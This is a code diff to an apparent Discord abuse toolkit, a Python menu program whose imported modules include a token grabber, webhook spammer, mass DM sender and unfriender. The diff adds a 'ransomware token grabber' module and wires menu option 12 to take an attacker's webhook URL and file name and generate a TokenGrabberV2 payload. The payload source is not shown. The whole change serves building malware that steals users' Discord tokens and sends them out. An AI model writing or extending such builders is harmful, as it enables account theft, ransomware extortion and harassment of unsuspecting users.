@@ -30,7 +30,7 @@ import util.create_token_grabber
 import util.unfriender
 import util.webhookspammer
 import util.massdm
-
+import util.create_ransomware_token_grabber
 threads = 3
 cancel_key = "ctrl+x"
 
@@ -295,9 +295,12 @@ def main():
 
 
     elif choice == '12':
-        print(f"{Fore.RED}COMING SOON. . .\n{Fore.RESET}Join the discord (https://cheataway.com) to see what will be here!")
-        sleep(4)
-        main()
+        WebHook = input(
+            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook Url: {Fore.RED}')
+        validateWebhook(WebHook)
+        fileName = str(input(
+            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}File name: {Fore.RED}'))
+        util.create_ransomware_token_grabber.TokenGrabberV2(WebHook, fileName)
 
 
     elif choice == '13':
